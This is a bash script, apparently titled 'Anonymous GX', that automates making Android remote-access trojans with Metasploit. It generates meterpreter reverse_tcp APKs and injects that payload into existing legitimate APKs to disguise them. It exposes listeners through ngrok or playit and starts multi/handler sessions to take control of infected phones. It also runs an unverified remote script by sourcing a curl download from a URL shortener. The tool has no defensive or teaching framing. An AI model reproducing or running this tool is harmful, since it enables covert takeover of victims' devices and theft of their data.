#!/usr/bin/bash
# تعريف الألوان
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m' 
Purple='\033[0;35m'
LPurple='\033[1;35m'
Blue='\033[0;34m'
LBlue='\033[1;34m'
LGreen='\033[1;32m'
LRed='\033[1;31m'
PAYLOAD=android/meterpreter/reverse_tcp
# spinner for tool
spinlong() {
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r %-${barlength}s \e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.04
    done
}
# check root for linux systems
check_root() {
    if [[ "$SYSTEM" != "termux" ]]; then
        if [[ "$EUID" -ne 0 ]]; then
            echo -e ${RED} ""
            bar="[-] Please Run This It As Root By sudo .. "
            spinlong
            sleep 1s
            exit 1
        else
            echo -e ${GREEN} "" 
            bar="[+] Root Access Verified.. "
            spinlong
            sleep 1s
        fi
    else
        echo -e ${YELLOW} "" 
        bar="[!] Skipping Root Check In Termux. "
        spinlong
    fi
}
#loading bar
loading_bar() {
    echo -e $LGreen ''
    figlet -c -f slant "Anonymous GX"
    sleep 2s
    echo ''
    echo -ne "$LGreen [+] Loading "
    for i in {1..30}; do
        echo -ne "▓"
        sleep 0.05
    done
    echo -e "${NC} Done!"
    sleep 1
}
# check for oprating system 
check_system() {
    if [[ -d "/data/data/com.termux" ]]; then
        echo -e ${GREEN} "" 
        bar="[+] You Are Using Termux.  "
        spinlong
        SYSTEM="termux"
    elif [[ -f "/etc/debian_version" ]]; then
        echo -e ${GREEN} "" 
        bar="[+] You Are Using Linux System .  "
        spinlong
        SYSTEM="kali"
    else
        echo -e ${RED} "" 
        bar="[-] Sorry Your System Is Not Support Your System ! "
        spinlong
        exit 1
    fi
}
#Check If Payloads directory is Exists
check_payloads_dir() {
    if [ -d "Payloads" ]; then
        echo ''
    else
    
        mkdir Payloads
    
    fi
}

# Official Links Of Us 

YT=https://youtube.com/@linux_whith_mohamed
WA=https://wa.me/+994402309201
TE=https://t.me/Dev_GX
GITHUB=https://github.com/DeveloperGX

# check if metasploit is installed on device
check_msf() {
    if command -v msfconsole &> /dev/null; then
        echo -e ""
        bar="[+] Metasploit Allrady Installed (^_^).  "
        spinlong
    else
        sleep 1s
        clear
        sleep 1s
        echo -e ""
        bar="[-] Metasploit Is Not Installed Yet Please Waiting For Installing It (^_^) ..."
        spinlong
        install_msf
    fi
}
# install playit tool
install_playit() {
    sleep 1s
    clear
    echo ''
    sleep 1s
    echo -e $LGreen ""; figlet -c -f slant "Install Playit"
    if [[ "$SYSTEM" == "termux" ]]; then 
        sleep 1s
        echo ""
        echo -e $LGreen ""
        sleep 0.5s
        bar="Install Playit In Termux App (^_^) .  "
        spinlong
        sleep 1s
        echo ""
        sleep 05s
        apt update; apt upgrade -y;
        apt install git wget -y 
        wget -O $PREFIX/bin/playit https://github.com/playit-cloud/playit-agent/releases/download/v0.15.26/playit-linux-aarch64
        chmod +x $PREFIX/bin/playit
        sleep 1s
        clear 
        sleep 1s
        echo ""
        echo -e $LGreen ""; figlet -c -f slant "Success Installation"
        sleep 1s
        echo ""
        sleep 1s
        echo -e $LGreen ""
        bar="Playit Successfully Installing You Can Run It By playit Command (^_^).  "
        spinlong
    elif [[ "$SYSTEM" == "kali" ]]; then 
        sleep 1s
        echo ""
        echo -e $LGreen ""
        sleep 0.5s
        bar="Install Playit In Linux System (^_^) .  "
        spinlong
        sleep 1s
        echo ""
        sleep 05s
        curl -SsL https://playit-cloud.github.io/ppa/key.gpg | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/playit.gpg >/dev/null ;
        echo "deb [signed-by=/etc/apt/trusted.gpg.d/playit.gpg] https://playit-cloud.github.io/ppa/data ./" | sudo tee /etc/apt/sources.list.d/playit-cloud.list;
        sudo apt update;
        sudo apt install playit;
        sleep 1s
        clear 
        sleep 1s
        echo ""
        echo -e $LGreen ""; figlet -c -f slant "Success Installation"
        sleep 1s
        echo ""
        sleep 1s
        echo -e $LGreen 
        bar="Playit Successfully Installing You Can Run It By playit Command (^_^).  "
        spinlong
    fi
}
# installing metasploit
install_msf() {
    sleep 2s
    clear
    sleep 1s
    echo -e $LRed '';figlet -c -f slant "Installing Metasploit"
    sleep 1.5s
    echo ''
    sleep 0.5s
    if [[ "$SYSTEM" == "termux" ]]; then
        pkg update -y && pkg upgrade -y;
        pkg install unstable-repo -y;
        pkg install git wget tar zip unzip curl ;
        source <(curl -fsSL https://kutt.it/msf)
    elif [[ "$SYSTEM" == "kali" ]]; then
        sudo rm msfinstall
        sudo apt update -y;
        sudo apt install git wget tar zip unzip curl -y;
        curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
        sudo rm msfinstall
    fi
    echo -e ${GREEN}""
    bar="[+] Metasploit Is Installed On Your Device Successfully (^_^). "
    spinlong
}
# getting data from user 
get_data() {
    sleep 1s
    clear 
    sleep 1s
    echo -e $LGreen ""; figlet -c -f slant "Getting Data"
    sleep 1s
    echo ''
    sleep 1s
}
#install ubuntu linux for termux users
install_ubuntu() {
    sleep 2s
    clear
    sleep 1s
    echo -e $LRed '';figlet -c -f slant "Ubuntu Linux"
    sleep 1.5s
    echo ''
    sleep 0.5s
    if [[ "$SYSTEM" == "termux" ]]; then
        pkg update; pkg upgrade -y
        apt update; apt upgrade -y;
        apt install git wget tar zip unzip proot proot-distro;
        proot-distro install ubuntu
        sleep 3s
        clear 
        sleep 2s
        echo ""
        sleep 1s
        echo -e $LGreen ""
        bar="Ubuntu Linux successfully insall As command Line You can Run It By proot-distro login ubuntu (^_^) ..  "
        spinlong
    else 

        echo -e $LRed ""
        bar="sorry Your system not support This Option .  "
        spinlong
        sleep 2s
    fi
}
#banner of social media
show_contacts() {
    sleep 1s
    echo -e "${LBlue}╔══════════════════════════════════════════════════════════╗"
    sleep 0.08
    echo -e "${LGreen}║                 Created By Anonymous GX                  ${LGreen}║"
    sleep 0.08
    echo -e "${LBlue}╠══════════════════════════════════════════════════════════╣"
    sleep 0.08
    echo -e "${YELLOW}║ 🔗 YouTube : ${NC}${YT}    $YELLOW║"
    sleep 0.08
    echo -e "${YELLOW}║ 💬 Telegram: ${NC}${TE}                         $YELLOW║"
    sleep 0.08
    echo -e "${YELLOW}║ 📞 WhatsApp: ${NC}${WA}                 $YELLOW║"
    sleep 0.08
    echo -e "${YELLOW}║ 💻 GitHub  : ${NC}${GITHUB}              $YELLOW║"
    sleep 0.08
    echo -e "${LBlue}╚══════════════════════════════════════════════════════════╝${NC}"
    sleep 0.08
    echo ''
    
    sleep 1s
}
# generate local payload
create_internal_payload() {
   sleep 0.3s
    clear
    sleep 0.3s
    echo -e $LGreen '';figlet -c -f slant "Generating Payload"
    echo '' 
    sleep 3s
    get_data
    read -p "Enter Your Local IP : " lhost1
    sleep 0.3s
    echo ''
    sleep 0.3s
    read -p "Enter Your Local Port : " lport1
    echo ''
    sleep 0.3s
    read -p "Please Enter Name Of APK Payload : " payload_name
    echo ''
    sleep 0.3s
    read -p "Please Enter Path Of Out APK Payload : " pay_path
    echo ''
    sleep 0.3s
    clear
    sleep 0.3s
    echo -e $LGreen '';figlet -c -f slant "Generating ..."
    echo '' 
    sleep 0.3s
    echo ''
    sleep 0.3s
    if [[ "$SYSTEM" == "termux" ]]; then 
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name.apk
        sleep 2s
        mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name.apk $pay_path
        sleep 1s
        echo ''
        sleep 1s
    elif [[ "$SYSTEM" == "kali" ]]; then
        sleep 1s
        xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$lhost1 LPORT=$lport1 -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name.apk > /dev/null 2>&1
        sleep 2s
        xterm -T " Moving APK TO PATH " -e mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name.apk $pay_path > /dev/null 2>&1
        sleep 1s
        echo ''
        sleep 1s
    fi
    
    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk To Path >> $pay_path (^_^) ${NC}"
    sleep 3s
}

# generate public payload
create_external_payload() {
    sleep 0.3s
    clear
    sleep 0.3s
    echo -e $LGreen '';figlet -c -f slant "Generating Payload"
    echo '' 
    sleep 3s
    get_data
    read -p "Enter Your Public Host : " lhost
    sleep 0.3s
    echo ''
    sleep 0.3s
    read -p "Enter Your Public Port : " lport
    sleep 0.3s
    echo ''
    sleep 0.3s
    read -p "Please Enter Name Of APK PAyload : " payload_name1
    echo ''
    sleep 0.3s
    read -p "Please Enter Path Of Out APK Payload : " pay_path1
    echo ''
    sleep 0.3s
    clear
    sleep 0.3s
    echo -e $LGreen '';figlet -c -f slant "Generating ..."
    echo '' 
    sleep 0.3s
    if [[ "$SYSTEM" == "termux" ]]; then 
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name1.apk
        sleep 2s
        mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name1.apk $pay_path1
        sleep 1s
        echo ''
        sleep 1s
    elif [[ "$SYSTEM" == "kali" ]]; then 
        xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$lport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name1.apk > /dev/null 2>&1
        sleep 2s
        xterm -T " Moving APK TO PATH " -e mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name1.apk $pay_path1 > /dev/null 2>&1 
        sleep 1s
        echo ''
        sleep 1s
    fi

    echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name1.apk To Path >> $pay_path1 (^_^) ${NC}"
    sleep 3s
}
# inject payload to apk file 
linjector() {
    sleep 1s
    echo ''
    sleep 1s
    get_data
    read -p "Please Enter Path Of APK File You Want To Inject : " POIA
    sleep 1s
    echo ''
    read -p "Please Enter Your Local IP : " lihost
    sleep 1s
    echo ''
    read -p "Please Enter Your Local Port : " liport
    sleep 1s
    echo ''
    read -p "Please Enter Name Of APK File After Injection : " oiapk
    sleep 1s
    echo ''
    read -p "Please Enter Path Of APK After Injection : " oliapkpath
    sleep 1s
    echo ''
    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $POIA -p $PAYLOAD LHOST=$lihost LPORT=$liport -a dalvik --platform android R -o $HOME/GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk 
    sleep 2s
    mv $HOME/GX-Tools/Android-Payload-Generator/Payload/$oiapk.apk $oliapkpath
    sleep 2s
    echo '' 
    echo -e $LGreen '';figlet -c -f slant "Success Injection"
    sleep 1s
    echo ''
    sleep 1s
    echo -e "${GREEN}[+] Your APK Injected Successfully By Local Payload With Name $oiapk.apk In $oliapkpath Path (^_^) ${NC}"
    sleep 3s
}
pinjector() {
    sleep 1s
    echo ''
    sleep 1s
    get_data
    read -p "Please Enter Path Of APK File You Want To Inject : " PPOIA
    sleep 1s
    echo ''
    sleep 1s
    read -p "Please Enter Your Public IP : " pihost
    sleep 1s
    echo ''
    read -p "Please Enter Your Public Port : " piport
    sleep 1s
    echo ''
    read -p "Please Enter Name Of APK File After Injection : " opiapk
    sleep 1s 
    echo ''
    read -p "Please Enter Path Of APK After Injection : " opiapkpath
    sleep 1s
    echo ''
    xterm -T " INJECT PAYLOAD In APK FILE " -e msfvenom -x $PPOIA -p $PAYLOAD LHOST=$pihost LPORT=$piport -a dalvik --platform android R -o $HOME/GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk 
    mv $HOME/GX-Tools/Android-Payload-Generator/Payload/$opiapk.apk $opiapkpath 
    sleep 2s
    echo '' 
    echo -e $LGreen '';figlet -c -f slant "Success Injection"
    sleep 1s
    echo ''
    sleep 1s
    echo -e "${GREEN}[+] Your APK Injected Successfully By Public Payload With Name $opiapk.apk In $opiapkpath Path (^_^) ${NC}"
    sleep 3s
}
injector() { 
    if [[ "$SYSTEM" == "termux" ]]; then
        sleep 1s
        clear
        sleep 1s
        echo ''
        echo -e $LRed "";figlet -c -f slant "Error System "
        sleep 1s
        echo ""
        sleep 0.5s
        bar="<<< Termux Not Support Injection Mode In Our Tool (^_^) >>>    "
        spinlong
        sleep 2s
    else 
        clear
        sleep 1s
        echo -e $LGreen '';figlet -c -f slant "Starting Injector"
        sleep 0.5s
        echo ''
        sleep 0.5s
        echo -e "${YELLOW}[1]${LPurple} Inject APK By Local Payload "
        sleep 0.3s
        echo '' 
        sleep 0.3s
        echo -e "${YELLOW}[2]${LPurple} Inject APK By Public Payload"$LGreen
        sleep 0.3s
        echo ''
        sleep 0.3
        read -p "Choose One Option : " listener_choice
        case $listener_choice in
        1) linjector ;;
        2) pinjector ;;
        *) echo -e "${RED}[-] Error Choice ! ${NC}"; sleep 2s ;;
        esac
    fi
}
# installing ngrok tool
install_ngrok() {
    if command -v ngrok &> /dev/null; then
        sleep 1s
        clear 
        echo -e $LGreen '';figlet -c -f slant "Ngrok Installed"
        sleep 0.5s
        echo ''
        sleep 0.5s
        echo -e ${GREEN}"" 
        bar="[+] Ngrok Tool Is Allrady Installed (^_^).  "
        spinlong
        sleep 2s
        clear 
    elif [[ "$SYSTEM" == "termux" ]]; then
        rm -rf ngrok-v3-stable-linux-arm64.tgz
        pkg install git wget tar -y
        sleep 1s
        cd $HOME
        wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
        sleep 1s
        tar -xvzf $HOME/ngrok-v3-stable-linux-arm64.tgz -C $PREFIX/bin
        sleep 1s
        rm -rf ngrok-v3-stable-linux-arm64.tgz
        rm -rf ngrok
        echo ''
        sleep 1s
        clear 
        sleep 0.5s
        echo -e $LGreen '';figlet -c -f slant "Success Installation"
        echo ''
        sleep 0.5s
        echo -e $LGreen ""
        bar="Ngrok Installation Was Success (^_*) " 
        spinlong
        sleep 2s
    elif [[ "$SYSTEM" == "kali" ]]; then
        sleep 1s
        sudo apt install zip unzip curl -y
        curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
        | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
        && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
        | sudo tee /etc/apt/sources.list.d/ngrok.list \
        && sudo apt update \
        && sudo apt install ngrok
        sleep 1s
        echo ''
        sleep 1s
        clear 
        sleep 0.5s
        echo -e $LGreen '';figlet -c -f slant "Success Installation"
        echo ''
        sleep 0.5s

        echo -e $LGreen ""
        bar="Ngrok Installation Was Success (^_*)  " 
        spinlong
    fi
    echo -e ${GREEN} ""
    bar="[+] Ngrok Was Installed Successfully .."
    spinlong
}
#Anonymous GX Banner 
colors=("$LRed" "$LBlue" "$LGreen" "$LPurple" "$Red")
color=${colors[$RANDOM % ${#colors[@]}]}
colorr=${colors[$RANDOM % ${#colors[@]}]}
colorrr=${colors[$RANDOM % ${#colors[@]}]}
color1=${colors[$RANDOM % ${#colors[@]}]}
color2=${colors[$RANDOM % ${#colors[@]}]}
color3=${colors[$RANDOM % ${#colors[@]}]}
color4=${colors[$RANDOM % ${#colors[@]}]}

# Adding Ngrok Token to Tool
add_ngrok_token() {
    sleep 1s
    clear 
    sleep 0.5s
    echo -e $LGreen '';figlet -c -f slant "Adding Token"
    sleep 1s
    echo ''
    sleep 0.5s
    read -p "Please Enter Ngrok Token : " ngrok_token
    echo ''
    sleep 1s
    ngrok config add-authtoken $ngrok_token
    sleep 1s
    echo ''
    sleep 0.5s
    clear 
    sleep 1s
    echo -e $LGreen '';figlet -c -f slant "Successfully"
    sleep 1s
    echo ''
    sleep 0.5s
    echo -e ${GREEN} ""
    bar="[+] Ngrok Token Saved Successfully !  "
    spinlong
    sleep 2s
}

# Open Our Youtube Channel 
open_youtube_channel() {
    xdg-open "https://youtube.com/@linux_whith_mohamed" &>/dev/null || termux-open-url "https://youtube.com/@linux_whith_mohamed"
}

# Open Local Session listener
start_internal_listener() {
    sleep 1s 
    clear 
    echo -e $LGreen '';figlet -c -f slant "Starting ..."
    sleep 0.5s
    echo ''
    sleep 0.5s
    echo ''
    sleep 0.5
    echo ''
    read -p "Please Enter Local IP : " lhost1
    sleep 0.5s
    echo ''
    sleep 0.5s
    read -p "Please Enter Local Port : " lport1
    sleep 1s
    clear 
    echo -e $LGreen '';figlet -c -f slant "Starting ..."
    sleep 0.5s
    echo ''
    sleep 0.5s
    echo -e $LGreen "Starting Local Sission Listener ..."
    echo ''
    sleep 0.5
    echo ''
    echo -e ${GREEN} "" 
    bar="[+] The Local Session Listener Was Started Successfully (^_^)  "
    spinlong
    if [[ "$SYSTEM" == "termux" ]]; then
        msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost1; set LPORT $lport1; run" 
    else 
        xterm -T "STARTING LOCAL SISSION" -e msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost1; set LPORT $lport1; run" 
    fi
}

# Open Public Sission Listener 
start_external_listener() {
    sleep 1s 
    clear 
    echo -e $LGreen '';figlet -c -f slant "Starting ..."
    sleep 0.5s
    echo ''
    sleep 0.5s
    echo ''
    sleep 0.5
    echo ''
    read -p "Please Enter Your Forwarding IP : " lhost
    sleep 0.5s
    echo ''
    sleep 0.5s
    read -p "Please Enter Forwarding Port : " lport
    sleep 1s
    clear 
    echo -e $LGreen '';figlet -c -f slant "Starting ..."
    sleep 0.5s
    echo ''
    sleep 0.5s
    echo -e $LGreen "Starting Public Sission Listener ..."
    echo ''
    echo ''
    echo -e ${GREEN} "" 
    bar="[+] The Public Session Listener Was Started Successfully (^_^) .   "
    spinlong
    if [[ "$SYSTEM" == "termux" ]]; then 
         msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $lport; run"
    else
        sleep 0.5
        xterm -T "STARTING PUBLIC SESSION" -e msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $lport; run"
    fi
}

# Main Menu 
main_menu() {
    check_payloads_dir
    sleep 1s
    clear
    sleep 0.5s
    echo -e $LGreen '';figlet -c -f slant "Starting Tool"
    sleep 0.5s
    echo ''
    sleep 0.5s
    bar="Welcome To My Tool Bro (^_^) .   "
    spinlong
    sleep 2s
    clear
    sleep 1s
    loading_bar
    echo ''
    check_system
    sleep 1s
    echo ''
    check_root
    sleep 1s
    echo ''
    sleep 1s
    clear
    sleep 1s
    loading_bar
    echo ''
    check_msf
    sleep 1s
    while true; do
        clear
        clear
        sleep 0.08
        echo ''
        sleep 0.08
        echo -e "${color} █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗     ██████╗ ██╗  ██╗"
        sleep 0.08
        echo -e "${colorr}██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝    ██╔════╝ ╚██╗██╔╝"
        sleep 0.08
        echo -e "${colorrr}███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗    ██║  ███╗ ╚███╔╝ "
        sleep 0.08
        echo -e "${color1}██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║    ██║   ██║ ██╔██╗ "
        sleep 0.08
        echo -e "${color2}██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║    ╚██████╔╝██╔╝ ██╗"
        sleep 0.08
        echo -e "${color3}╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝     ╚═════╝ ╚═╝  ╚═╝"
        sleep 0.08
        echo -e "${color4}                            Script Version => 1"
        sleep 0.08
        echo ''
        show_contacts
        sleep 0.4
        echo -e "\n${YELLOW}[1]${LPurple} Generate Local Payload "
        sleep 0.2
        echo -e "${YELLOW}[2]${LPurple} Generate Public Payload "
        sleep 0.2
        echo -e "${YELLOW}[3]${LPurple} Inject APK File By Payload "
        sleep 0.2
        echo -e "${YELLOW}[4]${LPurple} Installing Ngrok Tool "
        sleep 0.2
        echo -e "${YELLOW}[5]${LPurple} Adding Ngrok Token "
        sleep 0.2
        echo -e "${YELLOW}[6]${LPurple} Installing Playit Tool "
        sleep 0.2
        echo -e "${YELLOW}[7]${LPurple} Installing Ubuntu Linux ( For Termux Users )"
        sleep 0.2
        echo -e "${YELLOW}[8]${LPurple} Start Listener Session "
        sleep 0.2
        echo -e "${YELLOW}[9]${LPurple} Our YouTube Channel "
        sleep 0.2
        echo -e "${YELLOW}[0]${LPurple} Exit Tool "
        sleep 0.2
        echo ''
        sleep 0.2
        read -p "Choose One Option From list : " choice  
        sleep 0.2

        case $choice in
            1) create_internal_payload ;; 
            2) create_external_payload ;;
            3) injector ;;
            4) 
                sleep 0.5s
                clear 
                echo -e $LGreen '';figlet -c -f slant "Install Ngrok"
                sleep 0.5s
                echo ''
                sleep 0.5s
                install_ngrok ;;
            5)
                sleep 0.5s
                clear 
                echo -e $LGreen '';figlet -c -f slant "Adding Token"
                sleep 0.5s
                echo ''
                sleep 0.5s
                add_ngrok_token ;;
            6) install_playit ;;
            7) install_ubuntu ;;
            9) open_youtube_channel ;;
            8) 
                clear
                sleep 1s
                echo -e $LGreen '';figlet -c -f slant "Starting Listener"
                sleep 0.5s
                echo ''
                sleep 0.5s
                echo -e "${YELLOW}[1]${LPurple} Open Local Listener Sission "
                sleep 0.3s
                echo '' 
                sleep 0.3s
                echo -e "${YELLOW}[2]${LPurple} Open Public Listener Sission"$LGreen
                sleep 0.3s
                echo ''
                sleep 0.3
                read -p "Choose One Option : " listener_choice
                case $listener_choice in
                    1) start_internal_listener ;;
                    2) start_external_listener ;;
                    *) echo -e "${RED}[-] Error Choice ! ${NC}"; sleep 2s ;;
                esac
                ;;
            0) 
                sleep 1s
                clear
                sleep 0.5s
                echo -e $LRed '';figlet -c -f slant "Closing Tool !"
                sleep 1s
                echo ''
                sleep 0.5s
                echo -e ${GREEN} "" 
                bar="[+] Closing Proggram ...  "
                spinlong ; sleep 1s ; exit 0 ;;
            *) 
                sleep 0.3s
                clear 
                echo -e $LRed '';figlet -c -f slant "Error !"
                sleep 0.5s
                echo ''
                echo -e ${RED} "" 
                bar="[-] Error Choice Please Try Again ! "
                spinlong ;sleep 1s ;;
        esac
    done
}
main_menu
